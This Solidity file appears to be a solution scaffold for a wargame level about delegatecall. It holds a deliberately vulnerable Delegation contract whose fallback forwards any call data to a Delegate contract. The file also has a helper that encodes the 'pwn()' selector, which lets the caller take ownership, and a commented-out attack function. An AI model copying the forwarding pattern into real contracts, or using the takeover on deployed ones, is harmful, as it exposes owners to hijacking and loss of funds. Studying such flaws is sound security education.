// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'hardhat/console.sol';

contract DelegateHack {

    Delegation delegation;

    constructor(address _delegationAddress){
        delegation = Delegation(_delegationAddress);
    }

    // function hackSetOwnership() public returns(bool) {
    //     (bool success, ) = address(delegation).delegatecall(abi.encodeWithSignature("pwn()"));
    //     return success;
    // }

    function getSignatureOf(string memory functionSig) public pure returns (bytes memory) {
        return abi.encodeWithSignature(functionSig);
    }
}

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}